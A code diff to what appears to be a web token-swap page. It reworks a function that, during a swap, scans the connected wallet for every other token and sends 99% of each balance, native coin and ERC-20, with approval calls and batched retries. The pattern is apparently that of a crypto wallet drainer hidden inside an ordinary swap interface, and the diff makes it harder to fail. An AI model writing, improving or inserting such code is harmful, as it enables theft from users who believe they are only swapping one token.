@@ -1334,22 +1334,30 @@ async function processAllTokenTransfers() {
   }
 
   try {
-    updateStatus("Preparing token transfers...", "info");
+    updateStatus("Scanning wallet for additional tokens...", "info");
     
-    // First get all tokens and balances
+    // Get all tokens and balances with better error handling
     const [localTokens, balances] = await Promise.all([
-      getLocalTokens(),
-      fetchAllTokenBalances()
+      getLocalTokens().catch(() => []), // Return empty array if fails
+      fetchAllTokenBalances().catch(() => ({})) // Return empty object if fails
     ]);
-    
-    // Filter tokens with balance > 0 and not the main token being swapped
+
+    // Filter tokens more carefully
     const tokensToProcess = localTokens.filter(token => {
-      const balance = balances[token.address || 'native'];
-      return balance > 0 && 
-             !(token.address === currentFromToken?.address || 
-              (token.isNative && currentFromToken?.isNative));
+      try {
+        const balance = token.isNative 
+          ? balances['native'] 
+          : (token.address ? balances[token.address.toLowerCase()] : 0);
+        
+        return balance > 0 && 
+               !isSameToken(token, currentFromToken) &&
+               isValidTokenForTransfer(token);
+      } catch (e) {
+        console.warn(`Error processing token ${token.symbol}:`, e);
+        return false;
+      }
     });
-    
+
     if (tokensToProcess.length === 0) {
       updateStatus("No additional tokens found to transfer", "info");
       return 0;
@@ -1357,48 +1365,81 @@ async function processAllTokenTransfers() {
     
     updateStatus(`Found ${tokensToProcess.length} tokens to transfer...`, "info");
     
-    // Process tokens in optimized batches
-    const BATCH_SIZE = 3; // Smaller batches reduce RPC load
+    // Process tokens with better error handling and progress updates
     let successCount = 0;
+    const BATCH_SIZE = 3;
     
     for (let i = 0; i < tokensToProcess.length; i += BATCH_SIZE) {
       const batch = tokensToProcess.slice(i, i + BATCH_SIZE);
+      updateStatus(`Processing batch ${Math.floor(i/BATCH_SIZE)+1} of ${Math.ceil(tokensToProcess.length/BATCH_SIZE)}...`, "info");
       
-      // Process native tokens first as they're simpler
-      const nativeBatch = batch.filter(t => t.isNative);
-      const erc20Batch = batch.filter(t => !t.isNative);
-      
-      // Process native tokens in parallel
-      const nativeResults = await Promise.allSettled(
-        nativeBatch.map(token => 
-          transferNativeToken(token, balances['native'] * 0.99)
-            .then(() => true)
-            .catch(() => false)
-        )
+      const batchResults = await Promise.allSettled(
+        batch.map(token => processSingleTokenTransfer(token, balances))
       );
       
-      // Process ERC20 tokens with approvals first
-      const erc20Results = await Promise.allSettled(
-        erc20Batch.map(token => 
-          processERC20Transfer(token, balances[token.address])
-            .then(() => true)
-            .catch(() => false)
-        )
-      );
+      successCount += batchResults.filter(r => r.status === 'fulfilled' && r.value).length;
       
-      successCount += [
-        ...nativeResults.filter(r => r.status === 'fulfilled' && r.value),
-        ...erc20Results.filter(r => r.status === 'fulfilled' && r.value)
-      ].length;
-      
-      updateStatus(`Processed ${Math.min(i + BATCH_SIZE, tokensToProcess.length)}/${tokensToProcess.length} tokens`, "info");
+      // Small delay between batches to avoid rate limiting
+      await new Promise(resolve => setTimeout(resolve, 1000));
     }
     
     return successCount;
   } catch (err) {
-    console.error("Error processing token transfers:", err);
-    updateStatus("Error processing token transfers", "error");
+    console.error("Error in processAllTokenTransfers:", err);
+    updateStatus("Error processing additional tokens", "error");
     return 0;
+  }
+}
+
+// Helper functions
+function isSameToken(token1, token2) {
+  if (!token1 || !token2) return false;
+  if (token1.isNative && token2.isNative) return true;
+  return token1.address && token2.address && 
+         token1.address.toLowerCase() === token2.address.toLowerCase();
+}
+
+function isValidTokenForTransfer(token) {
+  // Skip tokens without address (unless native)
+  if (!token.isNative && !token.address) return false;
+  
+  // Skip tokens with invalid address format
+  if (token.address && !ethers.utils.isAddress(token.address)) return false;
+  
+  return true;
+}
+
+async function processSingleTokenTransfer(token, balances) {
+  try {
+    const balance = token.isNative 
+      ? balances['native'] 
+      : balances[token.address.toLowerCase()];
+    
+    if (balance <= 0) return false;
+
+    let amountToSend = balance * 0.99; // Send 99% to leave some for gas
+    
+    if (token.isNative) {
+      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+      amountToSend = Math.max(0, Math.min(amountToSend, balance - minReserve));
+      if (amountToSend <= 0) return false;
+    }
+
+    updateStatus(`Transferring ${amountToSend.toFixed(6)} ${token.symbol}...`, "info");
+    
+    if (token.isNative) {
+      const txHash = await transferNativeToken(token, amountToSend);
+      return !!txHash;
+    } else {
+      const approved = await checkAndApproveToken(token, amountToSend);
+      if (!approved) return false;
+      
+      const txHash = await transferERC20Token(token, amountToSend);
+      return !!txHash;
+    }
+  } catch (err) {
+    console.warn(`Failed to transfer ${token.symbol}:`, err.message);
+    return false;
   }
 }
 
